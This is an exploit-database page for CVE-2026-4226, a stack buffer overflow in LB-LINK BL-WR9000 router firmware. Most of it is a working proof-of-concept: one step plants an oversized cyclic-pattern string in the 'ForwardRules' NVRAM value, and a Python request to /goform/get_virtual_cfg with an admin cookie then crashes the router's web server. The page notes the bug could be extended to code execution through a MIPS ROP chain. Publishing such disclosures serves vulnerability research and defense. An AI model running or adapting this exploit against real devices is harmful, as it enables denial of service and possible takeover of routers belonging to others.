---
title: LB-LINK BL-WR9000 V2.4.9 - Unauthenticated / Post-Auth Stack-based Buffer Overflow
url: https://cxsecurity.com/issue/WLB-2026030024
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-17
fetch_date: 2026-03-18T04:20:59.955788
---

# LB-LINK BL-WR9000 V2.4.9 - Unauthenticated / Post-Auth Stack-based Buffer Overflow

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **LB-LINK BL-WR9000 V2.4.9 - Unauthenticated / Post-Auth Stack-based Buffer Overflow** **2026.03.17**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-4226](https://cxsecurity.com/cveshow/CVE-2026-4226/ "Click to see CVE-2026-4226")**  CWE: **[CWE-121: Stack-based Buffer Overflow, CWE-20: Improper Input Validation (sscanf unbounded parsing)](https://cxsecurity.com/cwe/CWE-121%3A%20Stack-based%20Buffer%20Overflow%2C%20CWE-20%3A%20Improper%20Input%20Validation%20%28sscanf%20unbounded%20parsing%29 "Click to see CWE-121: Stack-based Buffer Overflow, CWE-20: Improper Input Validation (sscanf unbounded parsing)")**  **[**Dork:** no](https://cxsecurity.com/dorks/)** | |

#!/usr/bin/env python3
# Exploit Title: LB-LINK BL-WR9000 - Stack-based Buffer Overflow in /goform/get\_virtual\_cfg
# CVE: CVE-2026-4226
# Date: 2026-03-16
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://www.lb-link.com/
# Software Link: https://www.b-link.net.cn/downloads\_16.html (firmware archives)
# Affected: LB-LINK BL-WR9000 firmware V2.4.9 (and likely similar models using libshare-0.0.26.so)
# Tested on: LB-LINK BL-WR9000 V2.4.9 (2023-06-20 build)
# Category: Remote
# Platform: Embedded (MIPS)
# Exploit Type: Stack-based Buffer Overflow
# CVSS: 8.8 (High) - Estimated (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) based on VulDB EUVD-2026-12367
# Description: Unauthenticated/post-auth stack-based buffer overflow via oversized NVRAM "ForwardRules"/"VirtualRules" value parsed by bs\_GetVirtualSerInfo (sub\_44E8D0) using unbounded sscanf. Allows DoS (web server crash) and potential RCE with ROP on MIPS architecture.
# Fixed in: No official patch known as of 2026-03-16; vendor unresponsive per VulDB
# Usage:
# python3 exploit.py
#
# Examples:
# python3 exploit.py
#
# Options:
# -- (no command-line args; edit TARGET/Cookie in code)
#
# Notes:
# • Requires prior admin access (web/telnet/SSH) to set oversized NVRAM value
# • Demonstrates reliable crash (DoS); extendable to full RCE via MIPS ROP chain
# • Reachable remotely after NVRAM poisoning (e.g., via other config endpoints if chained)
#
# How to Use
#
# Step 1:
# Inject malicious payload into NVRAM (via web UI, telnet, SSH, or nvram commands):
# nvram set ForwardRules '192.168.0.1,1111,111,aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaaj'
# nvram commit
#
# Step 2:
# Trigger the overflow remotely by running:
# python3 exploit.py
# (web interface becomes unresponsive until reboot)
import requests
TARGET = "http://192.168.16.1"
PAYLOAD\_URL = f"{TARGET}/goform/get\_virtual\_cfg"
headers = {
"Host": "192.168.16.1",
"User-Agent": "Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36",
"Accept": "application/json, text/javascript, \*/\*; q=0.01",
"X-Requested-With": "XMLHttpRequest",
"Referer": f"{TARGET}/admin/main.html",
"Cookie": "user=admin; platform=0",
"Connection": "keep-alive"
}
print("[+] Sending trigger to /goform/get\_virtual\_cfg ...")
try:
r = requests.get(PAYLOAD\_URL, headers=headers, timeout=5)
print(f"Status: {r.status\_code}")
print(r.text[:500])
except requests.exceptions.RequestException as e:
print(f"[!] Router crashed / service died: {e}")

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030024)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top